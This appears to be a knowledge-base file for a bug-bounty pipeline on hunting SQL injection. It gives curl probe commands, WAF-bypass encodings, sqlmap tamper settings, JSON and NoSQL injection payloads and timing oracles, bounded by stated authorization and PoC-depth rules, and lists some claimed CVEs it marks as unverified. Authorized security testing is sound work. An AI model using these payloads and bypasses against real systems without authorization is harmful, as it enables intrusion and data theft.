# class-sqli — SQL Injection hunting

Research compiled 2026-07-03. Sources: HiveSecurity 2026 SQLi guide, sqlmap docs, PortSwigger SQLi, June 2026 Ghauri writeup, gasmask WAF bypass (2025).

**Pipeline role:** SQLi is an ACTIVE LANE. Confirm primitive: `'` vs `''` differential (error + boolean length change). Second stage: **sqlmap** (operator-authorized, in-scope+paying only) OR **Ghauri** when sqlmap is WAF-blocked. Hard lines: PoC-depth only (`--banner`/`--current-db`/`--current-user`/`--dbs`); NEVER mass `--dump` of third-party PII; rate-limited (`--delay 1 --threads 1`); SKIP "no automated scanners" programs. Results must go to operator — NEVER automated.

---

## The confirm primitive (pipeline-safe)

```bash
# Step 1: error trigger
curl -s "https://HOST/path?param='" | grep -i 'error\|sql\|syntax\|ORA-\|MySQL\|SQLSTATE'

# Step 2: boolean differential (TRUE vs FALSE)
TRUE:  curl -s "https://HOST/path?param=1' AND '1'='1"   # length L1
FALSE: curl -s "https://HOST/path?param=1' AND '1'='2"   # length L2
# |L1 - L2| > 0 AND L1 matches baseline → boolean injectable

# Step 3: time-based (blind, no error/content diff)
curl -s "https://HOST/path?param=1' AND SLEEP(5)--"      # response delayed ~5s → injectable


---
<!-- applied-proposal: 2026-07-17_kb-enrich_class-sqli + 2026-07-19_kb-enrich_class-sqli -->
### Applied research — kb-enrich (2026-07-17 / 2026-07-19)

## WAF-bypass encodings (payload level)
- Inline comment splitting: `SELECT/**/password/**/FROM/**/users` (defeats `\s+`-anchored regex WAFs)
- Parenthesis-as-delimiter: `SELECT(password)FROM(users)`
- URL-encoded newline: `SELECT%0apassword%0aFROM%0ausers`
- Case randomization (`uNiOn SeLeCt`) + double URL-encoding (`%2555NION`)
- sqlmap starting combo: `--tamper=space2comment,randomcase` (50+ tampers exist; pick per-WAF — Cloudflare/AWS WAF/ModSecurity each favor different ones)

## ORM escape-hatch injection (new finding class to watch for)
Every ORM has a raw-query escape hatch that reintroduces string-concat SQLi:
- Django `.raw(f"... WHERE username = '{username}'")`
- SQLAlchemy `db.execute(text(f"... WHERE name = '{name}'"))`
Signal: an endpoint whose error format/behavior differs from the rest of the app's parameterized ORM
calls suggests a raw-query path underneath — worth an extra `'` probe even if sibling endpoints are clean.

## Second-order / stored SQLi (currently unhandled by our confirm primitive)
Payload stored harmlessly at write time (e.g. `admin'--` as a registration username) fires later when
reused unparameterized in a DIFFERENT query (password reset, admin lookup, audit-log render). Our
single-request `'` vs `''` differential cannot catch this — requires manually tracing a stored text
field (username/display-name/address) across endpoints. Flag any text field that accepts SQL
metacharacters without rejection at write time as a manual second-order follow-up candidate.

## JSON-context bypass payloads (for JSON-body APIs, WAF-signature evasion)
- PostgreSQL JSON containment: `'/*/OR/*/'{"a":1}'::jsonb @> '{"a":1}'::jsonb--`
- MySQL JSON_EXTRACT: `'/*/OR/*/JSON_EXTRACT('{"a":1}','$.a')=1--`
Both avoid literal `OR 1=1`-shaped tokens that legacy WAF signatures match on.

## NoSQL/MongoDB operator injection (adjacent — relevant on JSON-API/Mongo-backed targets)
- Auth-bypass: `{"username":"admin","password":{"$ne":null}}`
- `$where` JS-eval: `'; return true; //` (closes literal inside `$where`, evaluated as JS → every doc
  matches); `sleep()` inside `$where` = time-based oracle equivalent to SQL `SLEEP()`.
- Detection signal: a JSON field normally taking a string/number behaves differently when sent as a
  nested object (`{"$gt":""}`) — sign the backend passes JSON straight into a query filter.

## Timing-oracle alternatives when SLEEP()/pg_sleep() is revoked
`generate_series(1,10000000)` (CPU burn), `repeat('a',1<<27)` (memory pressure), or a recursive CTE
counting to ~5e7 — measurable delay without the sleep grant, for hardened targets that lock down
sleep functions specifically to kill time-based blind SQLi.

## WAF-blocked differential — escalation ladder (added 2026-07-19)
When the plain `'` vs `''` differential gets blocked/sanitized/WAF-406'd but the target is otherwise
a plausible SQLi candidate, escalate through these before declaring the lane dead — each stays within
our existing PoC-depth / rate-limited doctrine (`--delay 1 --threads 1`, no mass `--dump`).

### 1. JSON-based payload rewrite (bypasses signature WAFs that don't parse JSON)
Claroty Team82 (disclosed, vendors since patched but self-hosted/older WAF instances may still be
exposed — verify current before relying on it): rewrite the classic boolean-true payload as a native
JSON operator instead of `OR 1=1` / `' or 'a'='a`.
- **MySQL:** `JSON_EXTRACT('{"id":14,"name":"Aztalan"}', '$.name') = 'Aztalan'`
- **PostgreSQL:** `'{"b":2}'::jsonb <@ '{"a":1,"b":2}'::jsonb`
- **SQLite:** `'{"a":2,"c":[4,5,{"f":7}]}' -> '$.c[2].f' = 7`
Confirmed bypassed (pre-patch) on Palo Alto, AWS ELB/WAF, Cloudflare, F5 Big-IP, Imperva. Use as a
SECOND differential probe when the plain `'`/`''` pair is blocked at the edge but not at the app.

### 2. sqlmap tamper-script combos (2025-2026)
Keep `--level 1 --risk 1` (raising those increases payload volume, conflicting with anti-burn doctrine);
layer tampers instead: `--tamper=space2comment,randomcase` for generic WAFs; add `charencode`,
`between`, `equaltolike` for Cloudflare/AWS WAF; `modsecurityversioned` for ModSecurity.

## ⚠️ Unverified fresh CVEs (2026-07-17) — NVD/vendor-advisory verify before acting, LEAD-only
- CVE-2025-1094 — claimed libpq encoding-confusion (BIG5/EUC_TW) defeating `PQescapeLiteral`; claimed patched PostgreSQL 13.19–17.3, Feb 2025.
- CVE-2026-42208 — claimed pre-auth SQLi in an LiteLLM-style AI-gateway. AI-gateway/LLM-proxy infra is an emerging, likely under-tested SQLi surface class regardless of this specific ID's validity.
- CVE-2026-40906 — claimed injection in an ElectricSQL-style Postgres replication-sync API (`/v1/shape`). Replication/CDC/logical-sync HTTP APIs are a fresh, rarely-tested injection surface class.

Sources: https://hivesecurity.gitlab.io/blog/sql-injection-complete-guide-2026/ ,
https://www.vulnsy.com/cheat-sheets/sql-injection ,
https://bugbounty.info/Attack-Surface/Web/Injection/SQLi/Second-Order ,
https://www.graphnodesoftware.com/blog/nosql-injection ,
https://infosecwriteups.com/waf-bypass-masterclass-using-sqlmap-with-proxychains-and-tamper-scripts-against-cloudflare-9d46b36bae94
